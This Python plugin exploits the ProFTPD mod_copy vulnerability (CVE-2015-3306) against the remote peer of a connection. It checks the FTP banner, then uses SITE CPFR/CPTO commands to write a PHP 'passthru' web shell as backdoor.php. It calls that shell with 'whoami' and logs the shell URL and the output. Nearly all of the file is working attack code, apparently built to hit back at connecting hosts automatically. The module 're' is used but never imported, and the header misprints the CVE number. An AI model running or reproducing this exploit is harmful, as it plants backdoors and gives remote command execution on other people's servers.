#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
*-----------------*
|CVE62015-3306    |
*-----------------*

https://nvd.nist.gov/vuln/detail/CVE-2015-3306
https://www.exploit-db.com/exploits/37262
https://www.exploit-db.com/exploits/36742
"""

import socket
import requests
import logging as log
from .IPlugin import IPlugin, connection_type


class Plugin(IPlugin):
	def __init__(self):
		super().__init__()
		self.port = 21
		self.connection_type = connection_type.RAW

	def config(self):
		pass
	def exec(self, connection):
		buffer = 1024
		rip, rport = connection.getpeername()
		directory = "/super_admin"
		payload = "<?php echo passthru($_GET['cmd']); ?>"
		try:
			banner_b = connection.recv(buffer)
			banner = banner_b.decode('utf-8')
			if "proftp" not in banner.lower():
				return
			connection.send(b"site cpfr /proc/self/cmdline\n")
			connection.recv(1024)
			connection.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
			connection.recv(1024)
			connection.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
			connection.recv(1024)
			connection.send(("site cpto " + directory + "/backdoor.php\n").encode("utf-8"))
			log.info("plugin=proftpd rip={}".format(rip))
			if "Copy successful" in str(connection.recv(1024)):
				log.info("plugin=proftpd rip={} shell={}".format(rip, "http://" + rip + "/backdoor.php"))
				data = requests.get("http://" + rip + "/backdoor.php?cmd=whoami")
				match = re.search('cpto /tmp/.([^"]+)', data.text)
				log.info("plugin=proftpd rip={} whoami={}".format(rip, match.group(0)[11::].replace("\n", "")))
		except Exception as e: log.debug("Error proftpd {}".format(e))